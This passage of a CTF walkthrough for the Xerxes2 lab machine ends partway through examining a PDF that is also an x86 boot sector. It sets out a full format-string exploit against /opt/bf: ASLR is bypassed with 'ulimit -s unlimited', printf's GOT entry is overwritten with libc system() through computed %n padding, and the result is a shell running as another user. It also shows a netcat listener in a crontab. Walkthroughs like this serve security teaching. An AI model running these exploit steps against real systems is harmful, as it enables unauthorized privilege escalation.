+</span><span class='line'>  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Secondly, ASLR is enabled, and can be seen when printing the shared library dependencies. The memory positions are different for every check:</p>
+
+<figure class='code'><figcaption><span>ASLR check on</span><a href='/opt/bf'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>ldd /opt/bf
+</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb7734000<span class="o">)</span>
+</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 <span class="o">(</span>0xb75c9000<span class="o">)</span>
+</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0xb7735000<span class="o">)</span>
+</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>ldd /opt/bf
+</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb779b000<span class="o">)</span>
+</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 <span class="o">(</span>0xb7630000<span class="o">)</span>
+</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0xb779c000<span class="o">)</span>
+</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>ldd /opt/bf
+</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb77c0000<span class="o">)</span>
+</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 <span class="o">(</span>0xb7655000<span class="o">)</span>
+</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0xb77c1000<span class="o">)</span>
+</span><span class='line'>delacroix@xerxes2:~<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Thankfully, since this is a x86 (32bit) OS, its quite trivial to disable this (sort of) with <code>ulimit -s unlimited</code></p>
+
+<figure class='code'><figcaption><span>ASLR disable</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span><span class="nb">ulimit</span> -s unlimited
+</span><span class='line'>
+</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>ldd /opt/bf
+</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0x4001e000<span class="o">)</span>
+</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 <span class="o">(</span>0x40026000<span class="o">)</span>
+</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0x40000000<span class="o">)</span>
+</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>ldd /opt/bf
+</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0x4001e000<span class="o">)</span>
+</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 <span class="o">(</span>0x40026000<span class="o">)</span>
+</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0x40000000<span class="o">)</span>
+</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>ldd /opt/bf
+</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0x4001e000<span class="o">)</span>
+</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 <span class="o">(</span>0x40026000<span class="o">)</span>
+</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0x40000000<span class="o">)</span>
+</span><span class='line'>delacroix@xerxes2:~<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The memory locations are now static :) With that done, lets have a look at what pointer we would like to override, and then where we should be overwriting it to. We first take a look at the Global Offset Table:</p>
+
+<figure class='code'><figcaption><span>/bin/opt GOT</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>objdump -R /opt/bf
+</span><span class='line'>
+</span><span class='line'>/opt/bf:     file format elf32-i386
+</span><span class='line'>
+</span><span class='line'>DYNAMIC RELOCATION RECORDS
+</span><span class='line'>OFFSET   TYPE              VALUE
+</span><span class='line'>08049a38 R_386_GLOB_DAT    __gmon_start__
+</span><span class='line'>08049a48 R_386_JUMP_SLOT   <span class="nb">printf</span>
+</span><span class='line'>08049a4c R_386_JUMP_SLOT   getchar
+</span><span class='line'>08049a50 R_386_JUMP_SLOT   __gmon_start__
+</span><span class='line'>08049a54 R_386_JUMP_SLOT   <span class="nb">exit</span>
+</span><span class='line'>08049a58 R_386_JUMP_SLOT   __libc_start_main
+</span><span class='line'>08049a5c R_386_JUMP_SLOT   memset
+</span><span class='line'>08049a60 R_386_JUMP_SLOT   putchar
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>delacroix@xerxes2:~<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here, we will choose to override the <code>printf</code> functions pointer. This is at 0x08049a48. So, this address will have the location of our <em>evil code</em>. But now, how do we know where the evil code is and <em>what</em> is it? Again, this was another interesting thing that had me researching for a very long time. In the end, it came to light that there is such a thing as <a href="http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf">ret2libc</a>. The basic idea here is that we override the pointer for <code>printf</code> to <code>system</code> with a argument. I highly recommend you read <a href="http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf">this pdf</a> for a proper explanation on what exactly this means.</p>
+
+<p>The only thing that is left to determine is where <code>system</code> is in memory. Luckily this is also pretty easy to find out. Fire up <code>gdb</code>, run the binary and <code>print system</code> to get the address:</p>
+
+<figure class='code'><figcaption><span>libc&#8217;s system</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>gdb -q /opt/bf
+</span><span class='line'>Reading symbols from /opt/bf...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run
+</span><span class='line'>Starting program: /opt/bf
+</span><span class='line'>usage: /opt/bf <span class="o">[</span>program<span class="o">]</span>
+</span><span class='line'><span class="o">[</span>Inferior 1 <span class="o">(</span>process 11342<span class="o">)</span> exited with code 0377<span class="o">]</span>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> print system
+</span><span class='line'><span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0x40062000 &lt;system&gt;
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Soooo, 0x40062000. We have the point in memory where <code>system()</code> lives, and we know where the program is going to go to lookup the <code>printf</code> function. All that is left now is to exploit the format string vulnerability, override the location of <code>printf</code> with <code>system</code>, and provide a new argument for the now fooled <code>printf</code> to run. A new argument can be given by simply providing another <code>#</code> (remember we have the source so that was easy to figure out).</p>
+
+<h3>/opt/bf &ndash; part4</h3>
+
+<p>We have all the information we need, lets get to work.</p>
+
+<p>We fire up <code>gdb</code>, and instead of printing the location of <code>AAAA</code>, we provide a memory address, with a <code>%n</code> format string so that we can write the amount of bites needed to override the pointer location.</p>
+
+<p>To aid in getting the exact amount of padding right, we will set a breakpoint just before the application finished so that we can examine the pointer 0x08049a48 from the GOT:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>gdb -q /opt/bf
+</span><span class='line'>Reading symbols from /opt/bf...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
+</span><span class='line'>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> disass main
+</span><span class='line'>Dump of assembler code <span class="k">for function </span>main:
+</span><span class='line'>   0x08048684 &lt;+0&gt;: push   %ebp
+</span><span class='line'>   0x08048685 &lt;+1&gt;: mov    %esp,%ebp
+</span><span class='line'>   0x08048687 &lt;+3&gt;: and    <span class="nv">$0xfffffff0</span>,%esp
+</span><span class='line'>   0x0804868a &lt;+6&gt;: sub    <span class="nv">$0x7540</span>,%esp
+</span><span class='line'>   0x08048690 &lt;+12&gt;:    cmpl   <span class="nv">$0x1</span>,0x8<span class="o">(</span>%ebp<span class="o">)</span>
+</span><span class='line'>   0x08048694 &lt;+16&gt;:    jg     0x80486b7 &lt;main+51&gt;
+</span><span class='line'>   0x08048696 &lt;+18&gt;:    mov    0xc<span class="o">(</span>%ebp<span class="o">)</span>,%eax
+</span><span class='line'>   0x08048699 &lt;+21&gt;:    mov    <span class="o">(</span>%eax<span class="o">)</span>,%eax
+</span><span class='line'>   0x0804869b &lt;+23&gt;:    mov    %eax,0x4<span class="o">(</span>%esp<span class="o">)</span>
+</span><span class='line'>   0x0804869f &lt;+27&gt;:    movl   <span class="nv">$0x804887c</span>,<span class="o">(</span>%esp<span class="o">)</span>
+</span><span class='line'>   0x080486a6 &lt;+34&gt;:    call   0x8048390 &lt;<span class="nb">printf</span>@plt&gt;
+</span><span class='line'>   0x080486ab &lt;+39&gt;:    movl   <span class="nv">$0xffffffff</span>,<span class="o">(</span>%esp<span class="o">)</span>
+</span><span class='line'>   0x080486b2 &lt;+46&gt;:    call   0x80483c0 &lt;<span class="nb">exit</span>@plt&gt;
+</span><span class='line'>   0x080486b7 &lt;+51&gt;:    movl   <span class="nv">$0x7530</span>,0x8<span class="o">(</span>%esp<span class="o">)</span>
+</span><span class='line'>   0x080486bf &lt;+59&gt;:    movl   <span class="nv">$0x0</span>,0x4<span class="o">(</span>%esp<span class="o">)</span>
+</span><span class='line'>   0x080486c7 &lt;+67&gt;:    lea    0x10<span class="o">(</span>%esp<span class="o">)</span>,%eax
+</span><span class='line'>   0x080486cb &lt;+71&gt;:    mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+</span><span class='line'>   0x080486ce &lt;+74&gt;:    call   0x80483e0 &lt;memset@plt&gt;
+</span><span class='line'>   0x080486d3 &lt;+79&gt;:    mov    0xc<span class="o">(</span>%ebp<span class="o">)</span>,%eax
+</span><span class='line'>   0x080486d6 &lt;+82&gt;:    add    <span class="nv">$0x4</span>,%eax
+</span><span class='line'>   0x080486d9 &lt;+85&gt;:    mov    <span class="o">(</span>%eax<span class="o">)</span>,%eax
+</span><span class='line'>   0x080486db &lt;+87&gt;:    lea    0x10<span class="o">(</span>%esp<span class="o">)</span>,%edx
+</span><span class='line'>   0x080486df &lt;+91&gt;:    mov    %edx,0x4<span class="o">(</span>%esp<span class="o">)</span>
+</span><span class='line'>   0x080486e3 &lt;+95&gt;:    mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+</span><span class='line'>   0x080486e6 &lt;+98&gt;:    call   0x80484ec &lt;bf&gt;
+</span><span class='line'>   0x080486eb &lt;+103&gt;:   movl   <span class="nv">$0x0</span>,<span class="o">(</span>%esp<span class="o">)</span> <span class="c"># &lt;-- we will break here</span>
+</span><span class='line'>   0x080486f2 &lt;+110&gt;:   call   0x80483c0 &lt;<span class="nb">exit</span>@plt&gt;
+</span><span class='line'>End of assembler dump.
+</span><span class='line'>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x080486eb
+</span><span class='line'>Breakpoint 1 at 0x80486eb
+</span><span class='line'>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run <span class="s2">&quot;$(python -c &#39;print &quot;</span>&gt;<span class="s2">&quot;.join([&quot;</span>+<span class="s2">&quot; * ord(x) for x in (&quot;</span><span class="se">\x</span>48<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span>%16<span class="nv">$n</span><span class="s2">&quot;)])&#39;)#&quot;</span>
+</span><span class='line'>Starting program: /opt/bf <span class="s2">&quot;$(python -c &#39;print &quot;</span>&gt;<span class="s2">&quot;.join([&quot;</span>+<span class="s2">&quot; * ord(x) for x in (&quot;</span><span class="se">\x</span>48<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span>%16<span class="nv">$n</span><span class="s2">&quot;)])&#39;)#&quot;</span>
+</span><span class='line'>
+</span><span class='line'>Breakpoint 1, 0x080486eb in main <span class="o">()</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x 0x08049a48
+</span><span class='line'>0x8049a48 &lt;<span class="nb">printf</span>@got.plt&gt;: 0x00000004
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Oooooooooooh. So basically 0x8049a48 now sais <code>printf</code> lives at 0x00000004. Not entirely true though, but we will fix this. Fixing this is quite easy too. Using some python again, we can calculate the amount of bytes we must write to get the memory location we want. We know we want to write to <code>system</code>, that lives in memory at 0x40062000. We will split the calculation up into 2 parts, and first write the 0x2000, and then the 0x4006. We can see that we have written 4 bytes already, so to calculate the first part, we will simply subtract 4 from 0x2000 and pad parameter 16 with the amount.</p>
+
+<figure class='code'><figcaption><span>Calculating the first offset</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>gdb<span class="o">)</span> shell <span class="nb">echo</span> <span class="k">$(</span>python -c <span class="s1">&#39;print 0x2000-0x4&#39;</span><span class="k">)</span>
+</span><span class='line'>8188 <span class="c"># output is a decimal value</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We now pad the format string as required, re-run the program in <code>gdb</code>, and inspect 0x08049a48 from the GOT</p>
+
+<figure class='code'><figcaption><span>first padded string</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run <span class="s2">&quot;$(python -c &#39;print &quot;</span>&gt;<span class="s2">&quot;.join([&quot;</span>+<span class="s2">&quot; * ord(x) for x in (&quot;</span><span class="se">\x</span>48<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span>%8188u%16<span class="nv">$n</span><span class="s2">&quot;)])&#39;)#&quot;</span>
+</span><span class='line'>The program being debugged has been started already.
+</span><span class='line'>Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y
+</span><span class='line'>
+</span><span class='line'>Starting program: /opt/bf <span class="s2">&quot;$(python -c &#39;print &quot;</span>&gt;<span class="s2">&quot;.join([&quot;</span>+<span class="s2">&quot; * ord(x) for x in (&quot;</span><span class="se">\x</span>48<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span>%8188u%16<span class="nv">$n</span><span class="s2">&quot;)])&#39;)#&quot;</span>
+</span><span class='line'>H�
+</span><span class='line'>Breakpoint 1, 0x080486eb in main <span class="o">()</span>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x 0x08049a48
+</span><span class='line'>0x8049a48 &lt;<span class="nb">printf</span>@got.plt&gt;: 0x00002000
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>You will see some whitespace output as a result of the <code>%8188u</code>, but inspecting the pointer from GOT reveals that we have the lower part of the memory now set correctly (0x00002000)! :) The upper part of the address is calculated in a similar way, however, we are going to be moving on 2 places in memory to write this value and provide another format string. This means that our lower part of the memory will change as a result, and we will need to compensate for that when we calculate the upper part.</p>
+
+<figure class='code'><figcaption><span>writing upper part of memory and offset change</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run <span class="s2">&quot;$(python -c &#39;print &quot;</span>&gt;<span class="s2">&quot;.join([&quot;</span>+<span class="s2">&quot; * ord(x) for x in (&quot;</span><span class="se">\x</span>48<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span><span class="se">\x</span>4a<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span>%8188u%16<span class="nv">$n</span><span class="s2">&quot; + &quot;</span>%17<span class="nv">$n</span><span class="s2">&quot;)])&#39;)#&quot;</span>
+</span><span class='line'>The program being debugged has been started already.
+</span><span class='line'>Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y
+</span><span class='line'>
+</span><span class='line'>Starting program: /opt/bf <span class="s2">&quot;$(python -c &#39;print &quot;</span>&gt;<span class="s2">&quot;.join([&quot;</span>+<span class="s2">&quot; * ord(x) for x in (&quot;</span><span class="se">\x</span>48<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span><span class="se">\x</span>4a<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span>%8188u%16<span class="nv">$n</span><span class="s2">&quot; + &quot;</span>%17<span class="nv">$n</span><span class="s2">&quot;)])&#39;)#&quot;</span>
+</span><span class='line'>H�J�                                                                                                                                                                                                              3
+</span><span class='line'>Breakpoint 1, 0x080486eb in main <span class="o">()</span>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x 0x08049a48
+</span><span class='line'>0x8049a48 &lt;<span class="nb">printf</span>@got.plt&gt;: 0x20042004
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As you can see, we have moved up 4 bytes on the lower part of the address, so we can simply take 4 off 8188 to fix that. To determine the upper part of the address though, we will do another hex calculation and remove the amount that we have from the amount that we want:</p>
+
+<figure class='code'><figcaption><span>calculating the upper part and fixing the offset</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>gdb<span class="o">)</span> shell <span class="nb">echo</span> <span class="k">$(</span>python -c <span class="s1">&#39;print 0x4006-0x2000&#39;</span><span class="k">)</span>
+</span><span class='line'>8198 <span class="c"># output is a decimal value</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run <span class="s2">&quot;$(python -c &#39;print &quot;</span>&gt;<span class="s2">&quot;.join([&quot;</span>+<span class="s2">&quot; * ord(x) for x in (&quot;</span><span class="se">\x</span>48<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span><span class="se">\x</span>4a<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span>%8184u%16<span class="nv">$n</span><span class="s2">&quot; + &quot;</span>%8198u%17<span class="nv">$n</span><span class="s2">&quot;)])&#39;)#&quot;</span>
+</span><span class='line'>The program being debugged has been started already.
+</span><span class='line'>Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y
+</span><span class='line'>
+</span><span class='line'>Starting program: /opt/bf <span class="s2">&quot;$(python -c &#39;print &quot;</span>&gt;<span class="s2">&quot;.join([&quot;</span>+<span class="s2">&quot; * ord(x) for x in (&quot;</span><span class="se">\x</span>48<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span><span class="se">\x</span>4a<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span>%8184u%16<span class="nv">$n</span><span class="s2">&quot; + &quot;</span>%8198u%17<span class="nv">$n</span><span class="s2">&quot;)])&#39;)#&quot;</span>
+</span><span class='line'>H�J�
+</span><span class='line'>Breakpoint 1, 0x080486eb in main <span class="o">()</span>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x 0x08049a48
+</span><span class='line'>0x8049a48 &lt;<span class="nb">printf</span>@got.plt&gt;: 0x40062000
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>w00t. We have rewritten the GOT for <code>printf</code> to the location of the libc <code>system</code> call using the format string vulnerability. Phew.</p>
+
+<h3>/opt/bf &ndash; part5</h3>
+
+<p>Now, all that is left is to get the <code>printf</code> to rerun (using the <code>#</code>) with a payload such as <code>/bin/sh</code>. We will append the <code>/bin/sh</code> to the end and just add another <code>#</code> to call <code>printf</code> (which is now overridden):</p>
+
+<figure class='code'><figcaption><span>Exploiting bf</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>/opt/bf <span class="s2">&quot;$(python -c &#39;print &quot;</span>&gt;<span class="s2">&quot;.join([&quot;</span>+<span class="s2">&quot; * ord(x) for x in (&quot;</span><span class="se">\x</span>48<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span><span class="se">\x</span>4a<span class="se">\x</span>9a<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span>%8184u%16<span class="nv">$n</span><span class="s2">&quot; + &quot;</span>%8198u%17<span class="nv">$n</span><span class="s2">&quot; + &quot;</span><span class="p">;</span>/bin/sh<span class="s2">&quot;)])&#39;)##&quot;</span>
+</span><span class='line'>H�J�                                                                                                                                                                                                              d
+</span><span class='line'><span class="nv">$ </span>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>delacroix<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>delacroix<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1001<span class="o">(</span>polito<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>1001<span class="o">(</span>polito<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>polito<span class="o">)</span>,1002<span class="o">(</span>delacroix<span class="o">)</span>
+</span><span class='line'><span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Oly. Crap. That. Was. Awesome. :D :D</p>
+
+<p>We have just exploited a format string vulnerability on a binary that has the NX bit set, encoded with brainfk using ret2libc.</p>
+
+<h2>becoming korenchkin</h2>
+
+<p>We just got a shell with a euid for <code>polito</code>. To make life easier, I copied the public key I generated earlier for the first shell into <code>polito</code>&rsquo;s home, and SSH&rsquo;d in as that user.</p>
+
+<p>At first glance, it appeared as if we have a gpg encrypted <code>dump</code> and a pdf. There was also a cronjob to start a netcat server piping a text file out via tcp/4444 (remember the mp3 form earlier? :D)</p>
+
+<figure class='code'><figcaption><span>polito home</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>polito@xerxes2:~<span class="nv">$ </span>ls -lh
+</span><span class='line'>total 43M
+</span><span class='line'>-rw-r--r-- 1 polito polito 140K Jul 16 10:57 audio.txt
+</span><span class='line'>-rw-r--r-- 1 polito polito  43M Jul 16 12:17 dump.gpg
+</span><span class='line'>-rw-r--r-- 1 polito polito  27K Jul 16 12:19 polito.pdf
+</span><span class='line'>polito@xerxes2:~<span class="nv">$ </span>crontab -l
+</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
+</span><span class='line'>@reboot <span class="k">while </span><span class="nb">true</span> <span class="p">;</span> <span class="k">do </span>nc -l -p 4444 &lt; /home/polito/audio.txt <span class="p">;</span> <span class="k">done</span>
+</span><span class='line'>polito@xerxes2:~<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There was not much I could do with the <code>dump.gpg</code> yet, so I decided to open up the pdf in a pdf viewer:</p>
+
+<p><img src="https://i.imgur.com/WMuVK8O.png"></p>
+
+<p>That is all the PDF had. The QR code resolves to &ldquo;XERXES is watching&hellip;&rdquo;. I tried to highlight all of the text in the PDF to maybe reveal a piece of text that was white in color, but nothing apparent came out. The next step was to run the PDF through the <code>file</code> utility.</p>
+
+<figure class='code'><figcaption><span>polito.pdf File</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>polito@xerxes2:~<span class="nv">$ </span>file -k polito.pdf
+</span><span class='line'>polito.pdf: x86 boot sector, code offset 0xe0 DBase 3 data file with memo<span class="o">(</span>s<span class="o">)</span> <span class="o">(</span>1146103071 records<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>&hellip;<em>x86 boot sector</em>&hellip; wait&hellip; <strong>WHAT</strong>?. Ok, so that is interesting. Opening the PDF in a HEX editor revealed 2 PDF headers:</p>
+
